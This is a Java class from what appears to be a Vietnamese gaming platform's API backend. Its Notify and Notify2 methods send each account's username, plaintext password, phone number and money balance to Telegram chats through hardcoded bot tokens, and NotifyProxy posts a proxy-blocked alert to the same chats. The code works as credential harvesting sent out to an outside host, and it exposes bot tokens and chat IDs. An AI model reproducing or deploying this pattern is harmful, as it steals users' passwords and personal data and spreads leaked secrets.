package com.vinplay.api.processors.accsunwin;

import com.vinplay.common.HttpCommon;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.io.IOException;

public class BaoSunwinAcc {
    public void NotifyProxy() {
        Response response = null;
        try {
            String noidung = "Proxy bị khóa. Báo IT các bạn ơi.";

            OkHttpClient client = HttpCommon.getInstance().getHttpClient().newBuilder()
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot5220219652:AAHIzhy4ZVWotpxR6D6gErYLlxVcHOHZO90/sendMessage?chat_id=-782732080&text=" + noidung)
                    .method("GET", null)
                    .build();
            response = client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            response.close();
        }
    }

    public void Notify(String username, String nickname, String tien, String phone, String codedl, String pass, boolean tinhtrang) {
        Response response = null;
        try {
            String noidung = "";
            if (tinhtrang == true) {
                noidung = "Nick name: " + nickname + "%0ASố tiền: " + tien + "%0AUser Name: " + username + "%0APassword: " + pass + "%0AĐã Đăng Ký Tự Động" + "%0ASố ĐT: " + phone;
            } else {
                noidung = "Nick name: " + nickname + "%0ASố tiền: " + tien + "%0AUser Name: " + username + "%0APassword: " + pass + "%0AChưa Đăng Ký" + "%0ASố ĐT: " + phone;
            }

            OkHttpClient client = HttpCommon.getInstance().getHttpClient().newBuilder()
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot5220219652:AAHIzhy4ZVWotpxR6D6gErYLlxVcHOHZO90/sendMessage?chat_id=-782732080&text=" + noidung)
                    .method("GET", null)
                    .build();
            response = client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            response.close();
        }
    }

    public void Notify2(String username, String nickname, String tien, String phone, String codedl, String pass, boolean tinhtrang) {
        Response response = null;
        try {
            String noidung = "";
            if (tinhtrang == true) {
                noidung = "Nick name: " + nickname + "%0ASố tiền: " + tien + "%0AUser Name: " + username + "%0APassword: " + pass + "%0AĐã Đăng Ký Tự Động" + "%0ASố ĐT: " + phone;
            } else {
                noidung = "Nick name: " + nickname + "%0ASố tiền: " + tien + "%0AUser Name: " + username + "%0APassword: " + pass + "%0AChưa Đăng Ký" + "%0ASố ĐT: " + phone;
            }

            OkHttpClient client = HttpCommon.getInstance().getHttpClient().newBuilder()
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot5160702569:AAFRY9jeEJyfTPbD3s3sNIOaVi_NdYMOTKA/sendMessage?chat_id=-674958937&text=" + noidung)
                    .method("GET", null)
                    .build();
            response = client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            response.close();
        }
    }
}
